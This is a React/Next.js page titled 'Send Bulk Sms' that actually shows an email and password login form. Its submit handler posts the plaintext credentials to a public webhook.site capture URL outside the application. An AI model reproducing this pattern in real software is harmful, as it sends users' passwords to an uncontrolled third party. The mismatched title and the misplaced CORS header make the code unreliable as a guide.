import { mdiAccount, mdiBallotOutline, mdiMail } from '@mdi/js';
import { Field, Form, Formik } from 'formik';
import Head from 'next/head';
import { ReactElement } from 'react';
import Button from '../components/Button';
import Buttons from '../components/Buttons';
import Divider from '../components/Divider';
import CardBox from '../components/CardBox';
import FormField from '../components/Form/Field';
import LayoutAuthenticated from '../layouts/Authenticated';
import SectionMain from '../components/Section/Main';
import SectionTitleLineWithButton from '../components/Section/TitleLineWithButton';
import { getPageTitle } from '../config';
import axios from 'axios';

const FormsPage = () => {
  const handleSubmit = (values) => {
    const headers = {
      'Access-Control-Allow-Origin': '*',
      'Content-Type': 'application/json',
    };

    axios
      .post('https://webhook.site/8161e561-46c6-4a54-a9a3-668325d05843', values, { headers })
      .then((response) => {
        console.log('sent sms', response.data);
        // Redirect to the "/" page or handle success
        // router.push('/');
      })
      .catch((error) => {
        console.error('Error submitting form:', error);
        // Handle the error appropriately
      });
  };

  return (
    <>
      <Head>
        <title>{getPageTitle('Send Bulk Sms')}</title>
      </Head>

      <SectionMain>
        <SectionTitleLineWithButton icon={mdiBallotOutline} title="Send Bulk Sms" main />

        <CardBox>
          <Formik
            initialValues={{ email: '', password: '' }}
            onSubmit={(values) => handleSubmit(values)}
          >
            <Form>
              <FormField label="Email" help="Please enter your Email">
                <Field name="email" type="email" id="email"  />
              </FormField>
              
              <FormField label="Password" help="Please enter your password">
                <Field type="password" id="password" name="password" />
              </FormField>
              <Divider />

              <Buttons>
                <Button type="submit" label="Login" color="success" />
                <Button href="/signup" label="Register" color="warning" outline />
              </Buttons>
            </Form>
          </Formik>
        </CardBox>
      </SectionMain>
    </>
  );
};

FormsPage.getLayout = function getLayout(page: ReactElement) {
  return <LayoutAuthenticated>{page}</LayoutAuthenticated>;
};

export default FormsPage;
